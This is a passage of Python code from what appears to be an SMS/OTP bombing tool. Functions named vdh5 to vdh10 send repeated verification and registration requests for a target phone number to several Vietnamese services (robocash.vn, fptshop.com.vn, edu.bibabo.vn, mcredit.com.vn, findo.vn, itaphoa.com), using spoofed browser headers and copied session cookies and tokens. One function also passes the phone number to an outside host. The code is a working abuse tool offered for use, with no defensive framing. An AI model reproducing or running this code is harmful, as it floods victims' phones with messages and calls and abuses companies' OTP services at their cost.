    'ec_png_client_utm': '%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
    'ec_etag_utm': '8e8f2df3-37da-cbb8-92ad-834def089367',
    'ec_etag_client': 'false',
    'ec_etag_client_utm': '%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
    '_ga': 'GA1.1.838151185.1690890503',
    '_ga_0YC73N6F7R': 'GS1.2.1692458323.14.1.1692458371.12.0.0',
    '_ga_EBK41LH7H5': 'GS1.1.1692458322.19.1.1692458371.0.0.0',
    '_clsk': 'at5ko6|1692458372004|3|1|q.clarity.ms/collect',
    'uid': '8e8f2df3-37da-cbb8-92ad-834def089367',
    'client': 'false',
    'client_utm': '%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
}

    headers = {
    'authority': 'robocash.vn',
    'accept': '*/*',
    'accept-language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'cookie': '_gcl_au=1.1.1698620040.1690890499; _fbp=fb.1.1690890500462.1646373504; mousestats_vi=78a3bb625f6a326b5378; _ym_uid=1690890501680762237; _ym_d=1690890501; _tt_enable_cookie=1; _ttp=9xN9J9ceiqBWtCD4J-snzQy-IMK; supportOnlineTalkID=PdWml2EntxKFO94Tzz5Tukkfs3Mpr587; __cfruid=379a4dfa76833650548bf45dda0d77e540e4fcd7-1692458313; _gid=GA1.2.2086604549.1692458321; mousestats_si=5e4f6cf34182fec603de; _clck=1tdoi1d|2|fea|0|1308; _ym_isad=2; _ym_visorc=w; XSRF-TOKEN=eyJpdiI6ImZaaERzNGVYRG11M3dtMTI5ZVRmanc9PSIsInZhbHVlIjoicWZ0ZzhadjEyanZ4M29nVEtmRnlEcUxHSUh1a0R6aCt2SVorbld0N0ZldXNNcFBUYlJXSTkyYThqMW52OWNhSjI4amVuTWQyL0llV3R1K3pYWU15RVlxQUR6cGd4Wjc0cERIYzVvb3BHSzIyeXJjdklPNXdDZTl1L1EvVjRuSGciLCJtYWMiOiI0YTRkOWQ5OTg3YmE1NTg3NWQ3MGI0ZjI3NzA1OWJjYmEzZGMxNWJmZTJjN2YwOTgzZjdjNzMzMjI2MjA1NGE2IiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6IjJRZ0NVaGdDMEFXZHZ1cUZuaXJIRnc9PSIsInZhbHVlIjoib3lnTzJQamkzaDRCaEluaE1FRUpVYWdhN0JTamJMZmphWjk4Nm1qRXZsNitGK1N1UXd1YXh6d0srUXdzQWZmZUEvR3IydWVZekZHVk44ZnQzOEZuQS9GVHZVMFMzSXBJeE4wWVluNTA2R2tpclV6UktrcFJUb05RSkVBRDlqVjAiLCJtYWMiOiIwZjc1MzAwNjc3MWE4NWNlZjNmMzJkNDdmYzRjYmQ0YTNiYTFjMDBkZGQ1NWJmMWFiY2MxZmJhMDE5ZjA4MDU1IiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6InliOSs2U1ZZV1RJT2c2cG9HRmhrUUE9PSIsInZhbHVlIjoiaHpIdmkrOEtmNWNzSjdRVnVYbnl5TzlrdStkMUxzVWM0bkV2UXZrRlVVUDdMV0wxeTNUYmcxdnB5N3duUWRvZzRkSkRnREZYMnBFU1ByREcvQjhvS0xNYkx1Z01ZUk5FYi9WSnJ4S09GamxtY0czT0crN0FoWGYxZEF2UnY1MEEiLCJtYWMiOiI5MDJkYjUxNWEwNzJmMGQzZTE5YWJjYjU1MDIzMzJjNzgyMzY5OTE0NDhkYTRmMmI0OGJmMGZlZWE5NDMzN2IzIiwidGFnIjoiIn0%3D; ec_cache_utm=8e8f2df3-37da-cbb8-92ad-834def089367; ec_cache_client=false; ec_cache_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D; ec_png_utm=8e8f2df3-37da-cbb8-92ad-834def089367; ec_png_client=false; ec_png_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D; ec_etag_utm=8e8f2df3-37da-cbb8-92ad-834def089367; ec_etag_client=false; ec_etag_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D; _ga=GA1.1.838151185.1690890503; _ga_0YC73N6F7R=GS1.2.1692458323.14.1.1692458371.12.0.0; _ga_EBK41LH7H5=GS1.1.1692458322.19.1.1692458371.0.0.0; _clsk=at5ko6|1692458372004|3|1|q.clarity.ms/collect; uid=8e8f2df3-37da-cbb8-92ad-834def089367; client=false; client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%7D',
    'origin': 'https://robocash.vn',
    'pragma': 'no-cache',
    'referer': 'https://robocash.vn/register',
    'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

    data = {
    'phone': phone,
    '_token': 'zzks3YA2gRA5xPlcCfFpT1viRlOJF86v7CxXINSv',
}

    response = requests.post('https://robocash.vn/register/phone-resend', cookies=cookies, headers=headers, data=data)
def apiurl(sdt):
    # Xây dựng URL với số điện thoại đã thay thế
    url = f"https://viduchung.click/bomaylaviduchungdeptry.php?phone={phone}"

    # Gửi yêu cầu GET đến URL
    requests.get(url)
def vdh10():
    cookies = {
        '_gcl_au': '1.1.1584248520.1696863191',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%228uHHQLF5lZCi1qTk9h8J%22%7D',
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '5ed1bba7-e921-4ad8-b843-61ea3420e241',
        'fpt_uuid': '%223cf7fba4-7700-46f5-bdea-ba209b50741d%22',
        'ajs_group_id': 'null',
        '_fbp': 'fb.2.1696863192654.1366932249',
        '__admUTMtime': '1696863193',
        '_tt_enable_cookie': '1',
        '_ttp': '3DAP_8ozJu_gH2HMjQKwLPP0ShR',
        'dtdz': '360b50d3-59a3-4318-bee1-cbab53ae7577',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__RC': '9',
        '__R': '1',
        '_gid': 'GA1.3.1044239947.1697099994',
        '_gat': '1',
        '_ga': 'GA1.1.2116445144.1696863191',
        'vMobile': '1',
        'cf_clearance': 'Ds.rUZtwAZFA0tmnNCgYdgRF67Ey9H2vycwdrDWu1LQ-1697099996-0-1-1887654.1cf5104b.568929b4-0.2.1697099996',
        '_hjSessionUser_731679': 'eyJpZCI6ImIwNmY4ZGNjLTY5NzctNTkxYS1hYTM5LTE1Mzk1NTBhNmQ4MiIsImNyZWF0ZWQiOjE2OTY4NjMxOTQwNDUsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6IjI2OWQwNDE3LTBmOGUtNDBkMC05MDM0LWY2YjAzOTRmM2QxMCIsImNyZWF0ZWQiOjE2OTcwOTk5OTgxODgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
        '_hjAbsoluteSessionInProgress': '0',
        '__uif': '__uid%3A6551281632885571587%7C__ui%3A-1%7C__create%3A1695128163',
        '__tb': '0',
        '__IP': '1952826262',
        '_ga_ZR815NQ85K': 'GS1.1.1697099994.2.0.1697100005.49.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': '_gcl_au=1.1.1584248520.1696863191; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%228uHHQLF5lZCi1qTk9h8J%22%7D; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=5ed1bba7-e921-4ad8-b843-61ea3420e241; fpt_uuid=%223cf7fba4-7700-46f5-bdea-ba209b50741d%22; ajs_group_id=null; _fbp=fb.2.1696863192654.1366932249; __admUTMtime=1696863193; _tt_enable_cookie=1; _ttp=3DAP_8ozJu_gH2HMjQKwLPP0ShR; dtdz=360b50d3-59a3-4318-bee1-cbab53ae7577; __iid=; __iid=; __su=0; __su=0; __RC=9; __R=1; _gid=GA1.3.1044239947.1697099994; _gat=1; _ga=GA1.1.2116445144.1696863191; vMobile=1; cf_clearance=Ds.rUZtwAZFA0tmnNCgYdgRF67Ey9H2vycwdrDWu1LQ-1697099996-0-1-1887654.1cf5104b.568929b4-0.2.1697099996; _hjSessionUser_731679=eyJpZCI6ImIwNmY4ZGNjLTY5NzctNTkxYS1hYTM5LTE1Mzk1NTBhNmQ4MiIsImNyZWF0ZWQiOjE2OTY4NjMxOTQwNDUsImV4aXN0aW5nIjp0cnVlfQ==; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6IjI2OWQwNDE3LTBmOGUtNDBkMC05MDM0LWY2YjAzOTRmM2QxMCIsImNyZWF0ZWQiOjE2OTcwOTk5OTgxODgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=0; __uif=__uid%3A6551281632885571587%7C__ui%3A-1%7C__create%3A1695128163; __tb=0; __IP=1952826262; _ga_ZR815NQ85K=GS1.1.1697099994.2.0.1697100005.49.0.0',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)

def vdh9():
    cookies = {
        'mp_376a95ebc99b460db45b090a5936c5de_mixpanel': '%7B%22distinct_id%22%3A%20%22%24device%3A18b230cb71d670-06149c95b8a1ef-26031e51-1fa400-18b230cb71d671%22%2C%22%24device_id%22%3A%20%2218b230cb71d670-06149c95b8a1ef-26031e51-1fa400-18b230cb71d671%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2F%22%2C%22%24initial_referring_domain%22%3A%20%22bibabo.vn%22%7D',
        '_gid': 'GA1.2.1929928144.1697100118',
        '_gat': '1',
        '_ga': 'GA1.1.1718406591.1697100118',
        '_fbp': 'fb.1.1697100118139.2114864606',
        'gaVisitorUuid': '9f81e315-5518-45e8-b139-bbf8b35999db',
        '_ga_6LQ4PSBDW0': 'GS1.2.1697100118.1.0.1697100118.60.0.0',
        'auth.strategy': 'cookie',
        'i18n_redirected': 'vn',
        '_ga_B05J0DJ8VM': 'GS1.1.1697100118.1.0.1697100122.0.0.0',
        'XSRF-TOKEN': 'eyJpdiI6InorNlNlSXl1V1h5OEtMUiticnNleGc9PSIsInZhbHVlIjoidktPRG1lZlwvSFVEQjVJckFlNjdWZmJmMk1iazNMQVwvNk1iYzA2elZcL29WbUhFSHUycVVSQ2phV1BXaTdyVkoxSSIsIm1hYyI6IjZlZmY4ZGMxMmQ4ZDAyNDJjOThkMWI3YzQ3ZjY2NzY0OWRlODYyMDY1YzlkM2ZjYjRhNDEwM2VkZjZlNzU2N2UifQ%3D%3D',
        'onebibabovn_session': 'm0ORorko8A2c7EeWeGVsMRVBbOHGi3ch62W7Xz4X',
    }

    headers = {
        'authority': 'edu.bibabo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'access-control-allow-credentials': 'true',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': 'mp_376a95ebc99b460db45b090a5936c5de_mixpanel=%7B%22distinct_id%22%3A%20%22%24device%3A18b230cb71d670-06149c95b8a1ef-26031e51-1fa400-18b230cb71d671%22%2C%22%24device_id%22%3A%20%2218b230cb71d670-06149c95b8a1ef-26031e51-1fa400-18b230cb71d671%22%2C%22%24initial_referrer%22%3A%20%22https%3A%2F%2Fbibabo.vn%2F%22%2C%22%24initial_referring_domain%22%3A%20%22bibabo.vn%22%7D; _gid=GA1.2.1929928144.1697100118; _gat=1; _ga=GA1.1.1718406591.1697100118; _fbp=fb.1.1697100118139.2114864606; gaVisitorUuid=9f81e315-5518-45e8-b139-bbf8b35999db; _ga_6LQ4PSBDW0=GS1.2.1697100118.1.0.1697100118.60.0.0; auth.strategy=cookie; i18n_redirected=vn; _ga_B05J0DJ8VM=GS1.1.1697100118.1.0.1697100122.0.0.0; XSRF-TOKEN=eyJpdiI6InorNlNlSXl1V1h5OEtMUiticnNleGc9PSIsInZhbHVlIjoidktPRG1lZlwvSFVEQjVJckFlNjdWZmJmMk1iazNMQVwvNk1iYzA2elZcL29WbUhFSHUycVVSQ2phV1BXaTdyVkoxSSIsIm1hYyI6IjZlZmY4ZGMxMmQ4ZDAyNDJjOThkMWI3YzQ3ZjY2NzY0OWRlODYyMDY1YzlkM2ZjYjRhNDEwM2VkZjZlNzU2N2UifQ%3D%3D; onebibabovn_session=m0ORorko8A2c7EeWeGVsMRVBbOHGi3ch62W7Xz4X',
        'origin': 'https://edu.bibabo.vn',
        'referer': 'https://edu.bibabo.vn/signup',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-xsrf-token': 'eyJpdiI6InorNlNlSXl1V1h5OEtMUiticnNleGc9PSIsInZhbHVlIjoidktPRG1lZlwvSFVEQjVJckFlNjdWZmJmMk1iazNMQVwvNk1iYzA2elZcL29WbUhFSHUycVVSQ2phV1BXaTdyVkoxSSIsIm1hYyI6IjZlZmY4ZGMxMmQ4ZDAyNDJjOThkMWI3YzQ3ZjY2NzY0OWRlODYyMDY1YzlkM2ZjYjRhNDEwM2VkZjZlNzU2N2UifQ==',
    }

    json_data = {
        'phone': phone,
    }

    response = requests.post(
        'https://edu.bibabo.vn/api/v1/web/auth/verifyPhone/requestOtp',
        cookies=cookies,
        headers=headers,
        json=json_data,
    )

def vdh8():
    headers = {
        'authority': 'api.itaphoa.com',
        'accept': 'application/json',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'origin': 'https://shop.mioapp.co',
        'referer': 'https://shop.mioapp.co/',
        'region-code': 'HCM',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    params = {
        'phone': phone,
        'type': 'call',
    }

    response = requests.get('https://api.itaphoa.com/customer/send-gen-otp', params=params, headers=headers)

def vdh7():
    cookies = {
        '.AspNetCore.Antiforgery.iDxHxxTbyew': 'CfDJ8DVMx7rRkFpJpsz5RKDfFWpUiuWsZDGV8yT_x-ieJA6NeKIQSZPG95ai5p3HeHyqwrJZuaVsW_yvEOd5zbDWxTEfKClkrBtEioRFU0yhvi5Qwr3WjrdOAu9TBQBiE1aiSRHK3OwTwaNb-9b9F3sJHnA',
        'MC.WEB.PORTAL': 'CfDJ8DVMx7rRkFpJpsz5RKDfFWopvTBPw2pdlBo%2FomG%2Bk7s%2F1628DITJE3P53Lr%2B4rvradaaHoguAP%2BJAfFh4kb6Jbh3QLNS06tXM0evFdBhTxMHlYrHLqizB8EezZJT29QcpmuKZk%2FCXQbTJP97jFCGHs63Nft82fKefJeUg4ym1RNE',
        '_gcl_au': '1.1.1605201530.1697100677',
        '_ga_TTZGWP0RXB': 'GS1.1.1697100677.1.0.1697100677.0.0.0',
        '_ga_XS831VGKPD': 'GS1.1.1697100677.1.0.1697100677.60.0.0',
        '_ga': 'GA1.3.2136226874.1697100678',
        '_gid': 'GA1.3.561811056.1697100678',
        '_gat_UA-215142412-1': '1',
        '_tt_enable_cookie': '1',
        '_ttp': 'sd_ABtboFuIna5H0eEEwJakaz4N',
        '_fbp': 'fb.2.1697100678672.2140738242',
        'afUserId': '323e4985-dd69-4b93-8739-3e1d62e020d3-p',
        'AF_SYNC': '1697100679980',
    }

    headers = {
        'authority': 'mcredit.com.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json; charset=UTF-8',
        # 'cookie': '.AspNetCore.Antiforgery.iDxHxxTbyew=CfDJ8DVMx7rRkFpJpsz5RKDfFWpUiuWsZDGV8yT_x-ieJA6NeKIQSZPG95ai5p3HeHyqwrJZuaVsW_yvEOd5zbDWxTEfKClkrBtEioRFU0yhvi5Qwr3WjrdOAu9TBQBiE1aiSRHK3OwTwaNb-9b9F3sJHnA; MC.WEB.PORTAL=CfDJ8DVMx7rRkFpJpsz5RKDfFWopvTBPw2pdlBo%2FomG%2Bk7s%2F1628DITJE3P53Lr%2B4rvradaaHoguAP%2BJAfFh4kb6Jbh3QLNS06tXM0evFdBhTxMHlYrHLqizB8EezZJT29QcpmuKZk%2FCXQbTJP97jFCGHs63Nft82fKefJeUg4ym1RNE; _gcl_au=1.1.1605201530.1697100677; _ga_TTZGWP0RXB=GS1.1.1697100677.1.0.1697100677.0.0.0; _ga_XS831VGKPD=GS1.1.1697100677.1.0.1697100677.60.0.0; _ga=GA1.3.2136226874.1697100678; _gid=GA1.3.561811056.1697100678; _gat_UA-215142412-1=1; _tt_enable_cookie=1; _ttp=sd_ABtboFuIna5H0eEEwJakaz4N; _fbp=fb.2.1697100678672.2140738242; afUserId=323e4985-dd69-4b93-8739-3e1d62e020d3-p; AF_SYNC=1697100679980',
        'origin': 'https://mcredit.com.vn',
        'referer': 'https://mcredit.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    json_data = phone

    response = requests.post('https://mcredit.com.vn/api/Customers/requestOTP', cookies=cookies, headers=headers, json=json_data)

def vdh6():
    headers = {
        'authority': 'api.findo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json;charset=UTF-8',
        'origin': 'https://www.findo.vn',
        'referer': 'https://www.findo.vn/',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'mobilePhone': {
            'number': phone,
        },
    }

    response = requests.post('https://api.findo.vn/web/public/client/phone/sms-code-ts', headers=headers, json=json_data)

def vdh5():
    cookies = {
        '__cfruid': '82d0615933bd133beba33dc3aeba7f8f495b6961-1697100958',
        '_gcl_au': '1.1.1599413006.1697100963',
        '_fbp': 'fb.1.1697100963307.2025014889',
        '_gcl_aw': 'GCL.1697100964.Cj0KCQjwsp6pBhCfARIsAD3GZuZblhlrDsPS1oe0wChM92YPEBgJMVCafjz_K3klXsHPF0tfATdx8vUaAhQkEALw_wcB',
        '_gid': 'GA1.2.2070565504.1697100964',
        '_gac_UA-49883034-25': '1.1697100964.Cj0KCQjwsp6pBhCfARIsAD3GZuZblhlrDsPS1oe0wChM92YPEBgJMVCafjz_K3klXsHPF0tfATdx8vUaAhQkEALw_wcB',
        '_dc_gtm_UA-49883034-25': '1',
        'mousestats_vi': '27b28f876a2856cbffa0',
        'mousestats_si': '8bb020f831f4a172cf02',
        '_tt_enable_cookie': '1',
        '_ttp': 'J1xW6MXCF00ToDZN_zyYnUhIyN-',
        '_clck': '13ebg88|2|ffs|0|1380',
        'XSRF-TOKEN': 'eyJpdiI6IlhBenRBazlCbkpHV1A5amhzN2dleUE9PSIsInZhbHVlIjoiWENaN1U0SEVFY1dXVUt4Qmg1V3hCUklGb3YreEwxSHQ3VXR0czRqcXpha1A4T0VoZmlITHE1ckJlZ0dBTmY5YytQRmROWGkwRzlBckNlSG5FSjVSWU9oNm1DMEZ6ZEFxbmh0Y0JtTERJQTZjSk05Y0o3dHlWZDJNdW1YWTNXdUoiLCJtYWMiOiJkZTBhYzE0MzFjN2M2NmE1YzJjNWM5ZDNmNDhiMDYxNGFiMDBhYWFhYjkwOGMwNGNkZDc0MGE4ZGE1OTVmY2M5IiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6ImZiOS9jSDZLdFNsZ0pGeXB2Qzhrb3c9PSIsInZhbHVlIjoiWU1qcUJJY21xTFdldmVYcHdZRUJCZWdZampVREdsYXRGM0JpdFR5aVFHbmwrWTlWQmtRZWE0R3Q1RVJZMTVOU2JTWkZoaVRFSklQblNVQWF3V0tmNC9uYlMzZW5aa3VDc01sNE56cE1LVzlLeVdKMXdPQUZnM1o3MjlpbUJYYmUiLCJtYWMiOiI1NzE5NGRjNmQ0OTY4ZmFkYjc4N2U5ZDY1MDIxMzA0OTk3NTVhMGJhOWE1NDQwNGQ5NTg3ODQzNjhiMzI2ZWViIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IithcDk0Zzg3UzdIMDRxaW9vREJZVnc9PSIsInZhbHVlIjoiQ2UzKy9wMkJiY1Z4N2hwUmg3S3VLWUpoc2VOTG9mUVNSRVoxUFpoK3UreStJYjJUTE9hT1VWeWhtZDJVTnJhQWdOeGhteGNiMlQ3V3BXZEdubTJrcFNEbVlkREJwTGdRaHFCc0dyWnpBQWgxc05LdTVMVnlCNTkwblhqNHd0MkIiLCJtYWMiOiI3ZTk4YTM2YzdlN2U1ZTBkMDA5YzAwNTk5YTMyMmI3ZDg4ZmIyNDZkNGFhMWM5MWZlMmU4NTZiMGUzZjM4ZmI2IiwidGFnIjoiIn0%3D',
        '_ga_EBK41LH7H5': 'GS1.1.1697100963.1.1.1697100965.58.0.0',
        '_ga': 'GA1.2.606750676.1697100964',
        '_ym_uid': '169710096651655972',
        '_ym_d': '1697100966',
        'jslbrc': 'w.202310120856042cafa301-68dd-11ee-a84d-0299c7a21129.A_GS',
        '_clsk': '1ucp13t|1697100968297|1|1|x.clarity.ms/collect',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        'ec_png_utm': '6408f033-a105-f560-a7be-1f96237fac84',
        'ec_etag_utm': '6408f033-a105-f560-a7be-1f96237fac84',
        'ec_cache_utm': '6408f033-a105-f560-a7be-1f96237fac84',
        'uid': '6408f033-a105-f560-a7be-1f96237fac84',
        'ec_png_client': 'false',
        'ec_etag_client': 'false',
        'ec_cache_client': 'false',
        'client': 'false',
        'ec_png_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'ec_etag_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'ec_cache_client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'client_utm': '%7B%22utm_source%22%3A%22google%22%2C%22utm_medium%22%3A%22cpc%22%2C%22utm_campaign%22%3A%22robocash_search_brand_vn_clicks%22%2C%22utm_term%22%3A%22robocash.%22%2C%22utm_content%22%3A%22ch_google_ads%7Ccrt_655585801606%7Ckwmt_e%7Cps_%7Csrct_g%7Csrc_%7Cdev_c%22%2C%22referer%22%3A%22https%3A%5C%2F%5C%2Fwww.google.com%5C%2F%22%7D',
        'supportOnlineTalkID': '0cy5BAhEasyrMQvE8fnessSC2Q000Nc7',
    }

    headers = {
        'authority': 'robocash.vn',
        'accept': '*/*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'cookie': '__cfruid=82d0615933bd133beba33dc3aeba7f8f495b6961-1697100958; _gcl_au=1.1.1599413006.1697100963; _fbp=fb.1.1697100963307.2025014889; _gcl_aw=GCL.1697100964.Cj0KCQjwsp6pBhCfARIsAD3GZuZblhlrDsPS1oe0wChM92YPEBgJMVCafjz_K3klXsHPF0tfATdx8vUaAhQkEALw_wcB; _gid=GA1.2.2070565504.1697100964; _gac_UA-49883034-25=1.1697100964.Cj0KCQjwsp6pBhCfARIsAD3GZuZblhlrDsPS1oe0wChM92YPEBgJMVCafjz_K3klXsHPF0tfATdx8vUaAhQkEALw_wcB; _dc_gtm_UA-49883034-25=1; mousestats_vi=27b28f876a2856cbffa0; mousestats_si=8bb020f831f4a172cf02; _tt_enable_cookie=1; _ttp=J1xW6MXCF00ToDZN_zyYnUhIyN-; _clck=13ebg88|2|ffs|0|1380; 